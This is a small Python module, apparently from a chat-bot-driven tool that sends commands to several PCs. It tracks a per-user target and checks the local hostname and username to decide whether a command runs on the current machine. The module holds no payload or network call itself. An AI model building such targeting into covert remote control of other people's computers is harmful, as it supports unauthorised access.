import util

active_targets = {}

def get_pc_name():
    """Get the computer's hostname/PC name"""
    try:
        import socket
        return socket.gethostname()
    except:
        return "Unknown"

def get_pc_info():
    """Get formatted PC information using util functions"""
    pc_name = get_pc_name()
    username = util.get_user_name()
    return f"{pc_name}\\{username}"

def set_target(user_id, target_pc):
    """Set target PC for a user"""
    active_targets[user_id] = target_pc.lower()
    return f"✅ Target set to: {target_pc}"

def clear_target(user_id):
    """Clear target for a user (run on all PCs)"""
    if user_id in active_targets:
        del active_targets[user_id]
        return "✅ Target cleared - commands will run on all PCs"
    else:
        return "❌ No target was set"

def get_target(user_id):
    """Get current target for a user"""
    return active_targets.get(user_id)

def should_execute(user_id):
    """Check if command should execute on this PC"""
    target = active_targets.get(user_id)
    
    if target is None:
        return True
    
    current_pc = get_pc_name().lower()
    current_user = util.get_user_name().lower()
    current_info = f"{current_pc}\\{current_user}".lower()
    
    return (target == current_pc or 
            target == current_user or 
            target == current_info or
            target in current_info)

def get_all_targets():
    """Get all active targets"""
    if not active_targets:
        return "No active targets set"
    
    result = "Active Targets:\n"
    for user_id, target in active_targets.items():
        result += f"User {user_id}: {target}\n"
    
    return result